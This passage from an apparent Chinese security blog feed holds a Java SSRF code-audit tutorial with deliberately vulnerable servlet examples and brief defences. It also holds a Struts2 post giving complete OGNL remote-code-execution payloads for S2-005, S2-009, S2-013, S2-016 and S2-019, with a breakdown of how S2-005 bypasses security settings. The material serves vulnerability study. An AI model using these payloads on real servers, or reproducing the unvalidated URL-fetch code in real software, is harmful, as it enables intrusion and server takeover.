    <link href="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h3><ol><li><p>概述</p><p> 1）<strong>背景</strong>：互联网上的很多Web应用提供了从其他服务器（也可以是本地）获取数据的功能，使用用户指定的URL，Web应用可以获取图片、文件资源（下载或读取）。</p><p> 2）<strong>定义</strong>：SSRF （Server-Side Request Forgery），服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。 请求伪造，顾名思义就是攻击者伪造正常的请求，以达到攻击的目的，就是常见的Web安全漏洞之一。如果“请求伪造”发生在服务器端，那么这个漏洞就叫做“服务器端请求伪造”即SSRF。</p><p> 3）<strong>示例</strong>：百度识图</p><p> 用户可以从本地或URL的方式获取图片资源，交给百度识图处理。如果提交的是URL地址，该应用就会通过URL寻找图片资源。如果Web应用开放了类似于百度识图这样的功能，并且对用户提供的URL和远端服务器返回的信息没有进行合适的验证或者过滤，就可能存在“请求伪造”的缺陷。</p></li><li><p>原理</p><p> 1）<strong>SSRF漏洞成因</strong></p><p> （1）服务端提供了从其他服务器应用获取数据的功能；<br> （2）服务端对目标地址做过滤与限制 。</p><p> 2）<strong>攻击目标</strong>：一般情况下 ， SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。</p></li><li><p>危害</p><ul><li>  对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>  攻击运行在内网或本地的应用程序。</li><li>  对内网 Web应用进行指纹识别，识别企业内部的资产信息 。</li><li>  攻击内外网的Web应用，主要是使用 HTTP GET请求就可以实现的攻击（比如struts2 、 SQli等） 。</li><li>  利用自file协议读取本地文件等 。</li></ul></li></ol><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><p><strong>HttpURLConnection与URLConnection的区别</strong>：</p><p>URLConnection 可以使用邮件、文件传输协议，而HttpURLConnection 就单指浏览器的HTTP协议。URLConnection实例不会在创建时建立实际的网络连接。</p><p><strong>可能存在漏洞的点</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpURLConnection.getInputStream<br>URLConnection.getInputStream<br>Request.Get.execute<br>Request.Post.execute<br>URL.openStream<br>ImageIO.read<br>OkHttpClient.newCall.execute<br>HttpClients.execute<br>HttpClient.execute<br>……<br></code></pre></td></tr></table></figure><ol><li><p><strong>HttpURLConnection</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/ssrfServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ssrfServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    <span class="hljs-keyword">this</span>.doGet(request, response);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String url = request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);   <span class="hljs-comment">//接收url的传参</span><br>        String htmlContent;<br>        PrintWriter writer = response.getWriter();  <span class="hljs-comment">//获取响应的打印流对象</span><br>        URL u = <span class="hljs-keyword">new</span> URL(url);   <span class="hljs-comment">//实例化url的对象</span><br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-comment">//每次当调用此URL的协议处理程序的URLStreamHandler.openConnection(URL)方法时， 都会创建一个新的URLConnection实例。</span><br>          <span class="hljs-comment">//URLConnection实例不会在创建时建立实际的网络连接。 只会在调用URLConnection.connect()时发生。</span><br>            URLConnection urlConnection = u.openConnection(); <span class="hljs-comment">//打开一个URL连接，并运行客户端访问资源。</span><br>            HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;  <span class="hljs-comment">//强转为HttpURLConnection</span><br>            BufferedReader base = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(httpUrl.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));  <span class="hljs-comment">//获取HttpURLConnection中的资源</span><br>            StringBuffer html = <span class="hljs-keyword">new</span> StringBuffer();<br>          <span class="hljs-comment">//把base里的资源传给htmlContent</span><br>            <span class="hljs-keyword">while</span> ((htmlContent = base.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                html.append(htmlContent);  <span class="hljs-comment">//htmlContent添加到html里面</span><br>            &#125;<br>            base.close();<br><br>            writer.println(html);<span class="hljs-comment">//响应中输出读取的资源</span><br>            writer.flush();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            writer.println(<span class="hljs-string">&quot;请求失败&quot;</span>);<br>            writer.flush();<br>        &#125;<br>&#125;<br>  <br><span class="hljs-comment">//openConnection：每次当调用此URL的协议处理程序的URLStreamHandler.openConnection(URL)方法时， 都会创建一个新的URLConnection实例。</span><br><span class="hljs-comment">//openStream():打开到此URL的连接并返回一个用于从该连接读入的InputStream。</span><br></code></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">String url = request.getParameter(<span class="hljs-string">&quot;picurl&quot;</span>);<span class="hljs-comment">//接收picurl的传参</span><br>StringBuffer response = <span class="hljs-keyword">new</span> StringBuffer();<br><br>URL pic = <span class="hljs-keyword">new</span> URL(url);<br>HttpURLConnection con = (HttpURLConnection) pic.openConnection();<span class="hljs-comment">//创建一个新的URLConnection并强制转换为HttpURLConnection</span><br>con.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>con.setRequestProperty(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/5.0&quot;</span>);<br>BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(con.getInputStream()));<span class="hljs-comment">//获取HttpURLConnection中的资源</span><br>String inputLine; <br><span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>    response.append(inputLine);<span class="hljs-comment">//inputLine添加到response</span><br>  &#125;<br>in.close();<br>modelMap.put(<span class="hljs-string">&quot;resp&quot;</span>,response.toString());<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;getimg.htm&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>URLConnection</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SSRFServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><br>        String url = req.getParameter(<span class="hljs-string">&quot;url&quot;</span>);   <span class="hljs-comment">//接收url的传参</span><br>        String htmlContent;<br>        PrintWriter writer = resp.getWriter();  <span class="hljs-comment">//获取响应的打印流对象</span><br>        URL u = <span class="hljs-keyword">new</span> URL(url);   <span class="hljs-comment">//实例化url的对象</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            URLConnection urlConnection = u.openConnection();<span class="hljs-comment">//打开一个URL连接，并运行客户端访问资源。</span><br>            <span class="hljs-comment">//HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;  //强转为HttpURLConnection</span><br>            BufferedReader base = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(urlConnection.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));   <span class="hljs-comment">//获取url中的资源</span><br>           <br>            StringBuffer html = <span class="hljs-keyword">new</span> StringBuffer();<br>           <span class="hljs-comment">//把base里的资源传给htmlContent</span><br>            <span class="hljs-keyword">while</span> ((htmlContent = base.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                html.append(htmlContent);  <span class="hljs-comment">//htmlContent添加到html里面</span><br>            &#125;<br>            base.close();<br><br>            writer.println(html);<span class="hljs-comment">//响应中输出读取的资源</span><br>            writer.flush();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            writer.println(<span class="hljs-string">&quot;请求失败&quot;</span>);<br>            writer.flush();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doGet(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>imageIO</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ssrf</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BufferedImage <span class="hljs-title">read</span><span class="hljs-params">(URL url)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">if</span> (url == <span class="hljs-keyword">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;输入内容为空&quot;</span>);<br>        &#125;<br><br><br>        InputStream  istream = url.openStream();  <span class="hljs-comment">//打开到此URL的连接并返回一个用于从该连接读入的InputStream。</span><br>        ImageInputStream stream =  ImageIO.createImageInputStream(istream);  <span class="hljs-comment">//获取文件流</span><br><br><br>        BufferedImage bi = ImageIO.read(stream);  <span class="hljs-comment">//返回 BufferedImage作为供给的解码结果</span><br><br>        <span class="hljs-keyword">return</span> bi;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/httpclientServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">httpclientServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String geturl = request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>      <span class="hljs-comment">//输出流 用于输出字符流数据或者二进制的字节流数据都可以</span><br>        ServletOutputStream outputStream = response.getOutputStream();<br>      <span class="hljs-comment">//ByteArrayOutputStream对byte类型数据进⾏写⼊的类 相当于⼀个中间缓冲层，将类写⼊到⽂件等其他outputStream。</span><br>        ByteArrayOutputStream os = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        URL url = <span class="hljs-keyword">new</span> URL(geturl);<br>      <span class="hljs-comment">//获取文件流</span><br>        BufferedImage image = ssrf.read(url);<br><span class="hljs-comment">//image流写到OS流</span><br>        ImageIO.write(image, <span class="hljs-string">&quot;png&quot;</span>, os);<br>      <span class="hljs-comment">//os.toByteArray()将流转换为数组</span><br>        InputStream input = <span class="hljs-keyword">new</span> ByteArrayInputStream(os.toByteArray());<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((len = input.read(bytes)) &gt; <span class="hljs-number">0</span>) &#123;<br>            outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>HttpClient</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建一个DefaultHttpClient的实例</span><br>CloseableHttpClient httpClient = HttpClients.createDefault();<br><span class="hljs-comment">//发送GET请求  POST: HttpPost httpPost = new HttpPost(url);</span><br>  HttpGet getRequest = <span class="hljs-keyword">new</span> HttpGet(url);<br>  HttpResponse response = httpClient.execute(getRequest);<br><br>  <span class="hljs-keyword">if</span>(response.getStatusLine().getStatusCode() == <span class="hljs-number">200</span>)<br>    &#123;<br>        HttpEntity entity = response.getEntity();<br>        <span class="hljs-keyword">return</span> EntityUtils.toByteArray(entity);<br>    &#125;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IOException(<span class="hljs-string">&quot;Error:下载图片失败&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>OkHttp</strong></p><p> okhttp是一个第三方类库，用于android中请求网络</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">String url = request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>OkHttpClient httpClient = <span class="hljs-keyword">new</span> OkHttpClient();<br>Request request = <span class="hljs-keyword">new</span> Request.Builder()<br>      .url(url)<br>      .build();<br>Response response = httpClient.newCall(request).execute();<br><span class="hljs-keyword">return</span> response.body().string(); <br></code></pre></td></tr></table></figure></li><li><p><strong>HttpRequest</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpRequest request = HttpRequest.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&quot;baseball gloves&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure></li></ol><p>做代码审计的时候，一般直接用自动化工具扫，或全局搜关键字。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li> 限制协议只能为http/https，防止跨协议。就是用HttpURLConnection。</li><li> 对获取的URL进行判断，设置url白名单。</li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>struts2漏洞payload及触发原理(一)</title>
    <link href="/2022/05/11/struts2%E6%BC%8F%E6%B4%9Epayload%E5%8F%8A%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86-%E4%B8%80/"/>
    <url>/2022/05/11/struts2%E6%BC%8F%E6%B4%9Epayload%E5%8F%8A%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​        过了一段迷茫期，试图重新捡起漏洞触发原理的研究，之前也没有认真的看过struts框架，停留在copy大佬的payload直接写进poc的阶段，这段时间还是认真沉淀一下，熟悉熟悉触发原理，做做深入研究吧。</p><p>​        第一篇先挑一部分struts元祖级别的编号漏洞看看，想必也不会那么难入门吧！</p><h1 id="0x01-s2-005-s2-009-s2-013-s2-016-s2-019-payload说明"><a href="#0x01-s2-005-s2-009-s2-013-s2-016-s2-019-payload说明" class="headerlink" title="0x01 s2-005/s2-009/s2-013/s2-016/s2-019 payload说明"></a>0x01 s2-005/s2-009/s2-013/s2-016/s2-019 payload说明</h1><h4 id="s2-005"><a href="#s2-005" class="headerlink" title="s2-005:"></a>s2-005:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">(&#x27;\43_memberAccess.allowStaticMethodAccess&#x27;)(a)=true&amp;(b)((&#x27;\43context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\75false&#x27;)(b))&amp;(&#x27;\43c&#x27;)((&#x27;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&#x27;)(c))&amp;(g)((&#x27;\43mycmd\75\&#x27;whoami\&#x27;&#x27;)(d))&amp;(h)((&#x27;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&#x27;)(d))&amp;(i)((&#x27;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&#x27;)(d))&amp;(j)((&#x27;\43myres\75new\40byte[51020]&#x27;)(d))&amp;(k)((&#x27;\43mydat.readFully(\43myres)&#x27;)(d))&amp;(l)((&#x27;\43mystr\75new\40java.lang.String(\43myres)&#x27;)(d))&amp;(m)((&#x27;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(d))&amp;(n)((&#x27;\43myout.getWriter().println(\43mystr)&#x27;)(d))<br></code></pre></td></tr></table></figure><p>​        这里的\40、\43与\75是字符ascii编码对应的十进制数，斜杆代表转义，分别对应空格、#与=，这边是有C语言的<code>putchar(&#39;\75&#39;)</code>方法对其解码，解码后的payload总结为两大部分：Ognl配置参数设置与攻击主体</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">第一部分Ognl配置参数设置：<br>(<span class="hljs-string">&#x27;#_memberAccess.allowStaticMethodAccess&#x27;</span>)(a)=<span class="hljs-keyword">true</span><br>&amp;(b)((<span class="hljs-string">&#x27;#context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]=false&#x27;</span>)(b))<br>&amp;(<span class="hljs-string">&#x27;#c&#x27;</span>)((<span class="hljs-string">&#x27;#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET&#x27;</span>)(c))<br>第二部分攻击主体：<br>&amp;(g)((<span class="hljs-string">&#x27;#mycmd=\&#x27;whoami\&#x27;&#x27;</span>)(d))<br>&amp;(h)((<span class="hljs-string">&#x27;#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)&#x27;</span>)(d))<br>&amp;(i)((<span class="hljs-string">&#x27;#mydat=new java.io.DataInputStream(#myret.getInputStream())&#x27;</span>)(d))<br>&amp;(j)((<span class="hljs-string">&#x27;#myres=new byte[51020]&#x27;</span>)(d))<br>&amp;(k)((<span class="hljs-string">&#x27;#mydat.readFully(#myres)&#x27;</span>)(d))<br>&amp;(l)((<span class="hljs-string">&#x27;#mystr=new java.lang.String(#myres)&#x27;</span>)(d))<br>&amp;(m)((<span class="hljs-string">&#x27;#myout=@org.apache.struts2.ServletActionContext@getResponse()&#x27;</span>)(d))<br>&amp;(n)((&#x27;#myout.getWriter().println(#mystr)&#x27;)(d))#<br></code></pre></td></tr></table></figure><p>​        大的结构里面，看到(a)、(b)、(c)、(d)这一类的写法是为了遵循Ognl语法树的强制执行<a href="https://blog.csdn.net/kuxinr/article/details/7591692">表达式规则</a>，将变量值写入载体abcd内。</p><p>​        第一部分的配置参数：</p><p>​        1.设置_memberAccess类中的allowStaticMethodAccess参数为true，允许静态方法调用；</p><p>​        2.谁在MethodAccessor类中的denyMethodExecution参数为false，允许方法执行；</p><p>​        3.设置_memberAccess类中的excludeProperties为空值，完成绕过官方增加安全配置禁止静态方法调用和否认方法执行限制。</p><p>​        第二部分攻击主体：</p><p>​        1.预设命令参数值<code>whoami</code>存入变量mycmd；</p><p>​        2.调用java.lang.Runtime类的子类getRuntime中命令执行方法exec执行预设的参数mycmd值，预设进程对象myret；</p><p>​        3.新建数据输出流java.io.DataInputStrea，将进程myret的数据流写入流变量mydat；</p><p>​        4.新建字节对象用于接收流数据；</p><p>​        5.读取流变量mydat的数据到myres字节对象中；</p><p>​        6.调用java.lang.String方法转化myres字节对象的内容到字符串变量mystr中；</p><p>​        7.创建struts2的HttpServletResponse类，写入对象myout；</p><p>​        8.将mystr的内容打印到响应界面。</p><h4 id="s2-009"><a href="#s2-009" class="headerlink" title="s2-009:"></a>s2-009:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">class.classLoader.jarPath=%28%23context[\&quot;xwork.MethodAccessor.denyMethodExecution\&quot;]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\&quot;allowStaticMethodAccess\&quot;]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&amp;z[%28class.classLoader.jarPath%29%28%27meh%27%29]<br></code></pre></td></tr></table></figure><h4 id="s2-013"><a href="#s2-013" class="headerlink" title="s2-013:"></a>s2-013:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">a=1$&#123;(%23_memberAccess[\&quot;allowStaticMethodAccess\&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())&#125;<br></code></pre></td></tr></table></figure><h4 id="s2-016"><a href="#s2-016" class="headerlink" title="s2-016:"></a>s2-016:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D<br></code></pre></td></tr></table></figure><h4 id="s2-019"><a href="#s2-019" class="headerlink" title="s2-019:"></a>s2-019:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;whoami&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()<br></code></pre></td></tr></table></figure><h1 id="0x02-触发原理"><a href="#0x02-触发原理" class="headerlink" title="0x02 触发原理"></a>0x02 触发原理</h1><h4 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005:"></a>S2-005:</h4><p>​        s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开。</p><p>触发点：</p><p>​        </p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>struts2</tag>
      
      <tag>payload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS 重装Python2导致pip2混乱</title>
    <link href="/2022/04/22/MacOS-%E9%87%8D%E8%A3%85Python2%E5%AF%BC%E8%87%B4pip2%E6%B7%B7%E4%B9%B1/"/>
    <url>/2022/04/22/MacOS-%E9%87%8D%E8%A3%85Python2%E5%AF%BC%E8%87%B4pip2%E6%B7%B7%E4%B9%B1/</url>
    
